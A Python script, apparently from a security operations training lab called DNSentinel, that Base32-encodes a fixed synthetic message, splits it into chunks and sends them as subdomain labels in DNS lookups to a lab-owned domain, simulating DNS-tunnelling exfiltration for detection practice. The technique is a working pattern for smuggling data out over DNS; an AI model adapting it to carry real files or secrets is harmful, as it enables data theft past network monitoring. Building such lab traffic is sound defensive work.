#!/usr/bin/env python3

import base64
import subprocess
import sys
import time

# DNSentinel Scenario 04 — authorized lab-only utility.
# Intentionally restricted to one project-owned DNS namespace.
DOMAIN = "tunnel.soclab.abdul4rehman215.tech"

# Harmless synthetic training content only.
MESSAGE = (
    "DNSENTINEL SCENARIO 04 HARMLESS SYNTHETIC DATA "
    "FOR AUTHORIZED OPERATOR TRAINING ONLY"
)

# Conservative fixed DNS-label chunk size.
CHUNK_SIZE = 20

# Small fixed pause between ordinary DNS lookups.
QUERY_DELAY_SECONDS = 2


def main():
    encoded = (
        base64.b32encode(MESSAGE.encode("utf-8"))
        .decode("ascii")
        .rstrip("=")
        .lower()
    )

    chunks = [
        encoded[i:i + CHUNK_SIZE]
        for i in range(0, len(encoded), CHUNK_SIZE)
    ]

    print("DNSentinel Scenario 04 client")
    print(f"Target: {DOMAIN}")
    print(f"Encoding: Base32")
    print(f"Chunks: {len(chunks)}")
    print("Beginning finite DNS A-query sequence.")

    failures = 0

    for number, chunk in enumerate(chunks, start=1):
        label = f"s04-{number:02d}-{chunk}"
        qname = f"{label}.{DOMAIN}"

        print(f"[{number}/{len(chunks)}] {qname}")

        result = subprocess.run(
            ["dig", "+short", qname, "A"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=10,
            check=False,
        )

        if result.returncode != 0:
            failures += 1
            print(
                f"Query failed with exit code {result.returncode}",
                file=sys.stderr,
            )

        time.sleep(QUERY_DELAY_SECONDS)

    print("Finite DNS sequence complete.")

    if failures:
        print(f"Queries with local execution errors: {failures}")
        return 1

    return 0


if __name__ == "__main__":
    sys.exit(main())
